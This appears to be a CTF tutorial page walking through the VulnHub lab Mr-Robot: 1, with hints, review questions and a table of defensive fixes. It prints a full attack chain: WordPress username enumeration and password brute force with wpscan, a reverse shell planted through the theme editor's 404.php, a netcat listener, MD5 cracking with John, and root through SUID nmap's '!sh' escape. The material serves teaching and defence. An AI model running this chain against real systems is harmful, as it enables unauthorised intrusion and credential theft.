# Machine 7 — Mr-Robot: 1

> **Position:** 7 of 13 · the midpoint · **Band 3 — Easy** (global rank **053** of 708)
> **Full writeup:** [`labs/3-053-mr-robot-1/README.md`](../../labs/3-053-mr-robot-1/README.md)

| | |
| --- | --- |
| **Machine** | Mr-Robot: 1 |
| **Author** | Leon Johnson |
| **Released** | 28 June 2016 |
| **Target** | Ubuntu 14.04, Apache + **WordPress** |
| **VulnHub** | [entry/mr-robot-1,151](https://vulnhub.com/entry/mr-robot-1,151/) |
| **Flags** | 3 keys |
| **Estimated time** | 4–6 hours |

---

## Why this machine is here

It is the best available demonstration of **content discovery** — the discipline of
finding the files a site has that its homepage does not link to. And it hands you the
most generous gift any CTF author has ever given: the site publishes **its own
password wordlist** in `robots.txt`.

It is also your first **username oracle**: WordPress tells you whether a username
exists by returning a *different error message*, which halves the brute-force search
space before you send a single password guess.

And it ends on a technique worth understanding deeply: **cracking an unsalted MD5
hash found in a home directory**, then a SUID escalation through a binary you would
never expect (`nmap`).

## Learning objectives

1. Treat **`robots.txt`** as the first file you read on any website, and explain why
   it is not a security control.
2. Do **content discovery** with `dirb`/`gobuster`/`ffuf`, and interpret a 200 that
   looks like a dead end.
3. Understand and exploit a **username enumeration oracle** in a login form.
4. **Clean and de-duplicate a wordlist** before using it — and know why the raw
   858,160-line `fsocity.dic` is unusable as-is.
5. Turn WordPress **Administrator** access into code execution via the **Theme Editor**.
6. Upgrade a raw netcat shell to a **PTY**, specifically because `su` will not work
   otherwise.
7. Identify an **unsalted MD5** hash by its length, and crack it with John.
8. Escalate via **SUID `nmap` 3.81**'s `--interactive` mode.

## Attack classes covered

| Class | Where on this box |
| --- | --- |
| **Sensitive file disclosure** | `robots.txt` → `fsocity.dic` + `key-1-of-3.txt` |
| **Content discovery** | `dirb` against a themed WordPress front end |
| **Username enumeration** | `wp-login.php` verbose errors + `wpscan -e u` → `elliot` |
| **Dictionary attack with a leaked list** | `wpscan -U elliot -P fsocity-clean.dic` → `ER28-0652` |
| CMS admin → RCE | Appearance → Editor → **`404.php`** → PHP reverse shell as `daemon` |
| **Weak password storage** | `/home/robot/password.raw-md5`, unsalted MD5 |
| Offline cracking | `john --format=Raw-MD5` → `abcdefghijklmnopqrstuvwxyz` |
| User pivot | `su robot` (needs a real TTY) |
| **SUID shell escape** | `/usr/local/bin/nmap` **3.81** → `--interactive` → `!sh` |

## Read first

- [02 — Web Attacks](../02-Web-Attacks.md) **§3** (content discovery and wordlists)
  and **§7** (WordPress and `wpscan`).
- [04 — Credentials and Cracking](../04-Credentials-and-Cracking.md) **§1**
  (recognising a 32-hex-char MD5), **§2** (wordlist hygiene) and **§4** (John).
- [06 — Shells, Persistence and Escapes](../06-Shells-Persistence-and-Escapes.md)
  **§2** — the TTY upgrade is *mandatory* on this box, not cosmetic.
- [05 — Linux Privilege Escalation](../05-Linux-Privilege-Escalation.md) §2.

## Before you start — answer these

1. What is `robots.txt` for, and why is putting a secret in it equivalent to
   publishing the secret?
2. A wordlist has 858,160 lines. What is your first action before using it, and why?
3. How can a login form tell you a username is valid without ever accepting a login?
4. What is the difference between **salted** and **unsalted** hashing, and why does
   unsalted make cracking dramatically easier?
5. Why will `su` fail in a raw netcat shell but work after a PTY upgrade?

## Hints ladder

<details>
<summary><strong>Rung 1 — a nudge</strong></summary>

The homepage is a themed fake IRC terminal. It is a **dead end**. Do not spend time on it.

Instead, ask: what is the very first file every web enumerator checks? It is a
convention file at the site root, and here it contains two entries — one of which is
a **dictionary**.

Then work out what CMS is running. The scan and the HTML will tell you.
</details>

<details>
<summary><strong>Rung 2 — what you find</strong></summary>

```bash
curl http://TARGET/robots.txt
```
```text
User-agent: *
fsocity.dic
key-1-of-3.txt
```

**Key 1** is right there. And `fsocity.dic` is a **wordlist the site publishes**:

```bash
wget http://TARGET/fsocity.dic
wc -l fsocity.dic              # 858160
sort -u fsocity.dic > fsocity-clean.dic
wc -l fsocity-clean.dic        # 11451   <- the same data, 75x smaller
```

Now enumerate WordPress users:

```bash
wpscan --url http://TARGET/ -e u
```
→ **`elliot`**.
</details>

<details>
<summary><strong>Rung 3 — the credential</strong></summary>

WordPress returns *"Invalid username"* versus *"The password you entered is
incorrect"* — a username oracle. You already have the username, so attack the
password with the site's own list:

```bash
wpscan --url http://TARGET/ -U elliot -P fsocity-clean.dic
```
```text
[SUCCESS] - elliot / ER28-0652
```

Log in. `elliot` is an **Administrator**, which means the **Appearance → Editor**
menu is available.
</details>

<details>
<summary><strong>Rung 4 — the shell and the pivot</strong></summary>

In Appearance → Editor, select the theme file **`404.php`**, replace its contents
with a PHP reverse shell, save, then trigger it by requesting a URL that does not
exist:

```bash
nc -lvnp 4444                                   # listener FIRST
curl http://TARGET/this-pagedoes-not-exist      # fires the 404 template
```

You land as **`daemon`** (uid=1). **Upgrade the TTY before continuing** — `su` will
not prompt correctly in a raw shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z, then locally: stty raw -echo; fg
```

`/home/robot` holds `key-2-of-3.txt` (`-r--------`, robot only) and
**`password.raw-md5`** (`-rw-r--r--`, world-readable):

```bash
cat password.raw-md5        # robot:c3fcd3d76192e4007dfb496cca67e13b
```

32 hex characters = **unsalted MD5**. On your attack box:

```bash
echo 'robot:c3fcd3d76192e4007dfb496cca67e13b' > robot.hash
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt robot.hash
# -> abcdefghijklmnopqrstuvwxyz
```

`su robot` → `cat key-2-of-3.txt`.
</details>

<details>
<summary><strong>Rung 5 — the answer</strong></summary>

1. `nmap -sC -sV -p-` → **80** and **443** open; 22 closed. Themed WordPress site.
2. **`robots.txt`** → `fsocity.dic` (**key 1** is `key-1-of-3.txt`) — the site leaks
   its own password dictionary (858,160 lines → **11,451** unique).
3. `wpscan -e u` → **`elliot`**; verbose login errors confirm it.
4. `wpscan -U elliot -P fsocity-clean.dic` → **`ER28-0652`** → Administrator.
5. **Theme Editor** → `404.php` → PHP reverse shell → **`daemon`** → TTY upgrade.
6. `/home/robot/password.raw-md5` → unsalted MD5 → John → **`abcdefghijklmnopqrstuvwxyz`**
   → `su robot` → **key 2**.
7. `find / -perm -4000` → **`/usr/local/bin/nmap` 3.81**, SUID root →
   `nmap --interactive` then **`!sh`** → `uid=1002(robot) euid=0(root)` →
   **key 3** at `/root/key-3-of-3.txt`.
</details>

## After you finish — review questions

1. Why did you de-duplicate `fsocity.dic`? What would have happened if you had run
   the raw list through `wpscan`?
2. Describe the username oracle precisely. What is the *minimal* change to WordPress
   that closes it?
3. `password.raw-md5` was world-readable. Was the world-readable bit the
   vulnerability, or was the MD5? Argue both.
4. Unsalted MD5 cracks in seconds. Roughly how much slower would the same password be
   under bcrypt, and why?
5. The password was `abcdefghijklmnopqrstuvwxyz`. Why did a **dictionary attack**
   find it when it is not in `rockyou.txt` in that form? Think about what the list
   actually contained.
6. Why is SUID on `nmap` a vulnerability while SUID on `passwd` is not? What property
   of `nmap` 3.81 specifically made it exploitable, and what changed in later
   versions?
7. The 404 page ran PHP. What is the correct way to serve a "not found" page, and why
   does a template editor in a CMS constitute an RCE feature by design?

## Defensive reflection

| Finding | Fix |
| --- | --- |
| `robots.txt` leaks `fsocity.dic` and a key | `robots.txt` is public. Move secrets behind authentication; never publish a wordlist |
| Username enumeration on `wp-login.php` | Return an identical generic message for both failure modes; add rate limiting and lockout |
| `elliot : ER28-0652` | Enforce a strong-password policy; add 2FA for all admin accounts; alert on high-volume login failures |
| Administrator can edit theme PHP | **This is a feature.** Restrict `unfiltered_html`/`edit_themes` capabilities; disable file editing with `define('DISALLOW_FILE_EDIT', true);` |
| `password.raw-md5` unsalted MD5 | Use bcrypt/argon2 with a per-user salt. Never store unsalted MD5 |
| World-readable credential file in `/home` | `chmod 600`; audit home directories for world-readable files |
| **SUID `nmap` 3.81** | `chmod u-s`. Remove `--interactive` exposure by upgrading nmap (later versions dropped it). Audit SUID against the stock set |
| Web server allowed outbound connections | Egress-filter; a PHP reverse shell should not reach the internet |

**The single biggest lesson:** *a CMS administrator is already root on the web tier.*
Theme and plugin editors exist to run PHP. If you grant admin, you have granted code
execution — so admin accounts need the same protection as server credentials.

---

## The commands, annotated — every input and every output

### 1. Scan

```bash
sudo nmap -sC -sV -p- -T4 -oA scans/mrrobot TARGET
```

```text
Not shown: 65532 closed tcp ports (conn-refused)
PORT    STATE  SERVICE VERSION
22/tcp  closed ssh
80/tcp  open   http    Apache httpd
|_http-title: Mr-Robot Corp
| http-robots.txt: 2 disallowed entries
|_/fsocity.dic /key-1-of-3.txt
443/tcp open   ssl/http Apache httpd
|_http-title: Mr-Robot Corp
| ssl-cert: Subject: commonName=www.example.com
|_http-robots.txt: 2 disallowed entries
|_/fsocity.dic /key-1-of-3.txt
```

Two things in that output decide the whole box. First, **`22/tcp closed ssh`** — SSH is
actively refused, so there is no brute-force path and no key-based entry. Second, the NSE
`http-robots.txt` script **read `robots.txt` for you and printed its two entries**:
`/fsocity.dic` and `/key-1-of-3.txt`. `-sC` is not decoration; it front-ran the first manual
step of the entire attack.

### 2. `robots.txt` — the first file you always read

```bash
curl -s http://TARGET/robots.txt
curl -s http://TARGET/key-1-of-3.txt
wget http://TARGET/fsocity.dic
wc -l fsocity.dic
```

```text
User-agent: *
fsocity.dic
key-1-of-3.txt
```
```text
073403c8a58a1f80d943455fb30724b9
```
```text
858160 fsocity.dic
```

`robots.txt` is a **polite convention for search-engine crawlers, not a security control** —
it is public by design, so listing a path there is publishing it. Here the site leaks **its
own password dictionary**. `key-1-of-3.txt` is 32 hex characters: an MD5-shaped string, and
flag 1.

`wc -l` counts lines: **858,160**. De-duplicate before attacking:

```bash
sort -u fsocity.dic > fsocity-clean.dic
wc -l fsocity-clean.dic
```
```text
11451 fsocity-clean.dic
```

858,160 → **11,451**: a 75× reduction with zero loss of coverage. `sort -u` sorts and drops
duplicates. Attacking with the raw list would take 75× longer for exactly the same result —
and would look 75× worse in the server's logs.

### 3. Username enumeration

```bash
wpscan --url http://TARGET/ -e u
```

```text
[i] User(s) Identified:

[+] elliot
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
```

Three independent detections agreeing is why you can trust the name. **The oracle behind
`Author Id Brute Forcing`** is WordPress's handling of `/?author=1`: it redirects to the
author's archive page, so requesting it with an invalid ID behaves differently from a valid
one. Separately, `wp-login.php` returns *"Invalid username"* versus *"The password you
entered for the username is incorrect"* — a second oracle. Either alone halves the search
space; together they turn a two-unknown problem into a one-unknown one.

### 4. The dictionary attack with the site's own list

```bash
wpscan --url http://TARGET/ -U elliot -P fsocity-clean.dic
```

```text
[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - elliot / ER28-0652
```

`-U` usernames, `-P` password list. `Performing password attack on Wp Login` means it used
the login form; with `xmlrpc.php` available it would say `on Xmlrpc`, which batches many
guesses per request and is far faster — and is a finding in itself. `ER28-0652` is a themed
password (a fictional employee ID), which is exactly why a **targeted** list won where
`rockyou` would not.

### 5. Theme Editor → code execution

Log in at `http://TARGET/wp-login.php`, then **Appearance → Editor**, select the theme file
**`404.php`**, replace its contents with a PHP reverse shell and save.

```bash
nc -lvnp 4444                                    # ATTACKER, first
curl -s -o /dev/null -w '%{http_code}\n' http://TARGET/this-page-does-not-exist
```

```text
200
```

WordPress administrators may edit theme PHP from the browser — **this is a feature, not a
bug**, and it means "WordPress admin" is equivalent to "code execution on the web server".
Requesting a URL that does not exist forces the `404.php` template to render, which runs your
PHP. `-o /dev/null -w '%{http_code}\n'` discards the body and prints only the status code —
note the theme's own 404 page returns **`200`**, because WordPress renders its "not found"
template successfully. Do not read that 200 as "the page exists".

```text
Ncat: Connection from 192.168.56.101.
daemon@linux:~$ id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

**`uid=1(daemon)`** — not `www-data`. This build runs Apache as the `daemon` account. Either
way you are unprivileged, and the UID number matters only for interpreting file permissions
later.

### 6. TTY upgrade — mandatory here

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z ; then locally:
stty raw -echo; fg
```

You need this **before** `su`. In a raw shell `su` fails with `su: must be run from a
terminal`, because there is no TTY for it to read the password from — and the error message
does not explain that.

### 7. The hash, and cracking it

```bash
ls -la /home/robot
cat /home/robot/password.raw-md5
```

```text
-r-------- 1 robot robot 33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot 39 Nov 13  2015 password.raw-md5
```
```text
robot:c3fcd3d76192e4007dfb496cca67e13b
```

Read the `ls -l` output as two facts. `key-2-of-3.txt` is **`-r--------`** — owner-read only,
so `daemon` cannot read it and you must *become* `robot`. `password.raw-md5` is
**`-rw-r--r--`** — world-readable, so you can. And its filename tells you the algorithm:
**raw MD5**, 32 hex characters, **unsalted**.

```bash
echo 'robot:c3fcd3d76192e4007dfb496cca67e13b' > robot.hash
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt robot.hash
john --show robot.hash
```

```text
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Press 'q' or Ctrl-C to abort, almost any other key for status
abcdefghijklmnopqrstuvwxyz (robot)
1g 0:00:00:00 DONE 3842p/s
Session completed.
```

`--format=Raw-MD5` removes the ambiguity of a bare 32-hex string (which could also be NTLM or
MD4). **`Loaded 1 password hash`** is the line that confirms John understood the input —
`No password hashes loaded` means a wrong format or a shell that ate a `$`. The result line is
`password (account)`, where `robot` came from the `user:hash` form in your input file.
`1g 0:00:00:00` — one guess, sub-second. **Unsalted MD5 offers no meaningful protection**;
hashcat reports tens of *billions* per second for `-m 0` on a modern GPU.

`abcdefghijklmnopqrstuvwxyz` is not in `rockyou` as a password — it is in there because
*someone* chose it, and rockyou records what real people actually chose.

### 8. Pivot, then SUID

```bash
su robot
cat /home/robot/key-2-of-3.txt
find / -perm -4000 -type f 2>/dev/null
```

```text
822c73956184f694993bedee6f27867f
```
```text
/usr/local/bin/nmap
```

`su robot` with the cracked password succeeds — and now `key-2-of-3.txt` is readable, because
you *are* its owner. The SUID search returns **one** entry, and it is not a stock binary:
`/usr/local/bin/nmap`. Note the path — `/usr/local/bin`, i.e. a **manually installed** nmap,
not the distribution's, which is why it is old.

```bash
nmap --version
nmap --interactive
```

```text
Nmap version 3.81 ( http://www.insecure.org/nmap/ )
```
```text
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
nmap> !sh
# id
uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
```

**nmap 3.81 still supports `--interactive`**, a mini-shell whose `!CMD` runs `CMD` through the
OS shell. Because the binary is SUID root, that shell inherits **`euid=0`** — effective root —
even though your real UID is still `1002(robot)`. Later nmap versions removed interactive mode
precisely because it was so frequently abused when installed setuid.

```bash
cat /root/key-3-of-3.txt
```

The lesson to carry away: **an old version of a trusted tool is an attack surface.** The
administrator installed nmap for convenience, set the SUID bit so any user could scan, and
never noticed that the version they chose had an interactive escape. `nmap` is not on
GTFOBins by accident.

---

_Back to [Learning Path 1](../README.md) · previous: [Machine 6 — bossplayersCTF: 1](06-bossplayersctf-1.md) · next: [Machine 8 — Empire: Breakout](08-empire-breakout.md) · full writeup: [`labs/3-053-mr-robot-1`](../../labs/3-053-mr-robot-1/README.md)._
